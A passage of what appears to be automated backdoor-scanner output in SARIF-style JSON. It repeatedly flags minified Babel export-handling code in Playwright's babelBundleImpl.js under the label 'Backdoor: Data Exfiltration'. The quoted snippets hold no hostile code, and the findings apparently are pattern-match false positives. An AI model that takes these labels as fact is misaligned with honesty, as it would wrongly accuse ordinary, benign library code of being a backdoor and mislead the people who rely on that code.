                      "markdown": "`ifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get(\"body\").forEach(t=>{if(t.isImportDeclaration())t.remove();else if(t.isExpor`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 8354,
                  "endLine": 1639,
                  "endColumn": 8359,
                  "snippet": {
                    "text": "ror('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get",
                    "rendered": {
                      "text": "ror('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get",
                      "markdown": "`ror('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.buildCodeFrameError(\"Unexpected default expression export.\")}}),s}function ope(e){e.get(\"body\").forEach(t=>{t.isExportDefaultDeclaration()&&(0,epe.default)(t)})}function lpe(e){e.get`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 8175,
                  "endLine": 1639,
                  "endColumn": 8180,
                  "snippet": {
                    "text": "&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.bui",
                    "rendered": {
                      "text": "&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.bui",
                      "markdown": "`&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\");else throw o.bui`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 8158,
                  "endLine": 1639,
                  "endColumn": 8163,
                  "snippet": {
                    "text": "medDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\")",
                    "rendered": {
                      "text": "medDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\")",
                      "markdown": "`medDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration())i(o.get(\"id\")).names.push(\"default\")`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 8120,
                  "endLine": 1639,
                  "endColumn": 8125,
                  "snippet": {
                    "text": "et(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration(",
                    "rendered": {
                      "text": "et(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration(",
                      "markdown": "`et(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")throw u.buildCodeFrameError('Illegal export \"__esModule\".');c.names.push(f)});else if(a.isExportDefaultDeclaration()){let o=a.get(\"declaration\");if(o.isFunctionDeclaration()||o.isClassDeclaration(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 7926,
                  "endLine": 1639,
                  "endColumn": 7931,
                  "snippet": {
                    "text": "let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")th",
                    "rendered": {
                      "text": "let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")th",
                      "markdown": "`let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.get(\"specifiers\").forEach(o=>{let l=o.get(\"local\"),u=o.get(\"exported\"),c=i(l),f=Ec(u,r);if(f===\"__esModule\")th`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 7818,
                  "endLine": 1639,
                  "endColumn": 7823,
                  "snippet": {
                    "text": "ock\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})});let s=new Map,i=a=>{let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.ge",
                    "rendered": {
                      "text": "ock\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})});let s=new Map,i=a=>{let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.ge",
                      "markdown": "`ock\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})});let s=new Map,i=a=>{let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifierPaths();Object.keys(l).forEach(u=>{if(u===\"__esModule\")throw o.buildCodeFrameError('Illegal export \"__esModule\".');i(l[u]).names.push(u)})}else a.ge`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 7669,
                  "endLine": 1639,
                  "endColumn": 7674,
                  "snippet": {
                    "text": "())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})});let s=new Map,i=a=>{let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifie",
                    "rendered": {
                      "text": "())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})});let s=new Map,i=a=>{let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifie",
                      "markdown": "`())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})});let s=new Map,i=a=>{let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.getOuterBindingIdentifie`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 7647,
                  "endLine": 1639,
                  "endColumn": 7652,
                  "snippet": {
                    "text": ".isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})});let s=new Map,i=a=>{let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.ge",
                    "rendered": {
                      "text": ".isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})});let s=new Map,i=a=>{let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.ge",
                      "markdown": "`.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})});let s=new Map,i=a=>{let o=a.node.name,l=s.get(o);if(!l){let u=n.get(o);if(u===void 0)throw a.buildCodeFrameError(`Exporting local \"${o}\", which is not declared.`);l={names:[],kind:u},s.set(o,l)}return l};return e.get(\"body\").forEach(a=>{if(a.isExportNamedDeclaration()&&(t||!a.node.source))if(a.node.declaration){let o=a.get(\"declaration\"),l=o.ge`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 7300,
                  "endLine": 1639,
                  "endColumn": 7305,
                  "snippet": {
                    "text": "rEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})})",
                    "rendered": {
                      "text": "rEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})})",
                      "markdown": "`rEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBindingIdentifiers()).forEach(l=>{n.set(l,o)})})`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 7256,
                  "endLine": 1639,
                  "endColumn": 7261,
                  "snippet": {
                    "text": "on ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBind",
                    "rendered": {
                      "text": "on ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBind",
                      "markdown": "`on ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";else return}Object.keys(a.getOuterBind`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 7221,
                  "endLine": 1639,
                  "endColumn": 7226,
                  "snippet": {
                    "text": "Exports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";els",
                    "rendered": {
                      "text": "Exports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";els",
                      "markdown": "`Exports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";else if(a.isVariableDeclaration())o=\"block\";els`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
